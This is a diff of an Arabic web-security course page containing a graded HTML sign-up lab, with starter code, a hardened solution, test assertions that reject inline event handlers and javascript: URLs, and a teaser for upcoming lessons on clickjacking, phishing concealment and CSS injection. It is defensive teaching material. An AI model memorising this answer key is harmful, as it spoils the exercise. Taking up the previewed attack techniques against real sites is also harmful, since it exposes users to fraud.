+          <desc><p>ابني صفحة تسجيل بتجمع أهم قواعد الجزء الأول. الاختبارات بتتشيك على كل نقطة:</p>
+          <ul><li>مستند سليم: DOCTYPE، <code>lang</code>، <code>meta charset</code> أول عنصر في الـ head، title.</li>
+          <li><code>meta name="referrer" content="no-referrer"</code>.</li>
+          <li>فورم <code>POST</code> لـ <code>/signup</code>: email (<code>type=email</code>، required، <code>autocomplete="email"</code>)، password (required، <code>minlength=12</code>، <code>autocomplete="new-password"</code>)، hidden <code>csrf_token</code> بقيمة مش فاضية، وزرار submit — وكل خانة ظاهرة ليها label.</li>
+          <li>iframe للشروط (<code>/terms.html</code>) عليه <code>title</code> و<code>sandbox</code> <b>من غير</b> <code>allow-same-origin</code>.</li>
+          <li>أي لينك خارجي (<code>https://</code>) بـ <code>target="_blank"</code> عليه <code>rel</code> فيه <code>noopener</code>.</li>
+          <li>ممنوع: أي <code>on…</code> attribute، أي <code>javascript:</code> URL، وأي <code>&lt;script&gt;</code>.</li></ul></desc>
+          <starter>
+            <html>
+            <head><title>Sign up</title></head>
+            <body>
+              <form action="/signup">
+                Email <input name="email">
+                Password <input name="password">
+                <button onclick="validate()">Sign up</button>
+              </form>
+              <a href="https://help.example/privacy" target="_blank">Privacy</a>
+              <iframe src="/terms.html"></iframe>
+            </body>
+            </html>
+          </starter>
+          <solution>
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1">
+              <meta name="referrer" content="no-referrer">
+              <title>Sign up — Shop</title>
+            </head>
+            <body>
+              <main>
+                <h1>Create your account</h1>
+                <form action="/signup" method="post">
+                  <input type="hidden" name="csrf_token" value="5c1e9a7b3d">
+                  <p><label for="email">Email</label>
+                     <input id="email" name="email" type="email" required autocomplete="email"></p>
+                  <p><label for="password">Password</label>
+                     <input id="password" name="password" type="password" required minlength="12" autocomplete="new-password"></p>
+                  <button type="submit">Sign up</button>
+                </form>
+                <p><a href="https://help.example/privacy" target="_blank" rel="noopener noreferrer">Privacy policy</a></p>
+                <iframe src="/terms.html" title="Terms of service" sandbox="allow-scripts" width="400" height="150"></iframe>
+              </main>
+            </body>
+            </html>
+          </solution>
+          <test label="DOCTYPE + lang + charset أول عنصر + title">doc.doctype && doc.doctype.name === "html" && (attr("html", "lang") || "").length >= 2 && $("head").firstElementChild && $("head").firstElementChild.hasAttribute("charset") && text("title").length > 0</test>
+          <test label="referrer = no-referrer">(attr('meta[name="referrer"]', "content") || "").trim().toLowerCase() === "no-referrer"</test>
+          <test label="الفورم POST لـ /signup">attr("form", "action") === "/signup" && $("form").method === "post"</test>
+          <test label="email: type email + required + autocomplete=email">$('[name="email"]') && $('[name="email"]').type === "email" && $('[name="email"]').required && attr('[name="email"]', "autocomplete") === "email"</test>
+          <test label="password: required + minlength 12 + new-password">$('[name="password"]') && $('[name="password"]').type === "password" && $('[name="password"]').required && attr('[name="password"]', "minlength") === "12" && attr('[name="password"]', "autocomplete") === "new-password"</test>
+          <test label="hidden `csrf_token` بقيمة مش فاضية">has('form input[type="hidden"][name="csrf_token"]') && attr('input[name="csrf_token"]', "value").trim().length >= 6</test>
+          <test label="كل خانة ظاهرة ليها label وفيه زرار submit">$$("form input").filter(i => i.type !== "hidden").every(i => i.labels.length > 0) && $$("form button, form input[type=submit]").some(b => b.type === "submit")</test>
+          <test label="iframe: title + sandbox من غير allow-same-origin">has("iframe") && $$("iframe").every(f => (f.getAttribute("title") || "").trim().length > 2 && f.hasAttribute("sandbox") && !/allow-same-origin/i.test(f.getAttribute("sandbox")))</test>
+          <test label="اللينكات الخارجية بـ _blank عليها noopener">$$('a[target="_blank"]').every(a => /\bnoopener\b/i.test(a.rel)) && has('a[href^="https://"]')</test>
+          <test label="مفيش on* ولا javascript: ولا script">count("script") === 0 && !$$("*").some(e => [...e.attributes].some(a => /^on/i.test(a.name) || /^\s*javascript:/i.test(a.value)))</test>
+          <hint>ابدأ من الـ head: `<meta charset>` أول عنصر. وافتكر: الـ onclick مش لازم — الـ validation بالـ attributes.</hint>
+        </html-lab>
+
+        <div class="callout tip reveal"><span class="ci">🚀</span><div><strong>خلصت الجزء الأول؟</strong><p>الجزء الجاي <b>CSS</b>: هتتعلم تبني أي layout وتصمم مواقع responsive احترافية، وهتشوف الوجه التاني للـ CSS — clickjacking متقن، إخفاء المحتوى في صفحات الـ phishing، وسرقة بيانات بالـ selectors (CSS injection). وبعده JavaScript كاملة، ثم جزء الـ Web Security.</p></div></div>
+      </section>
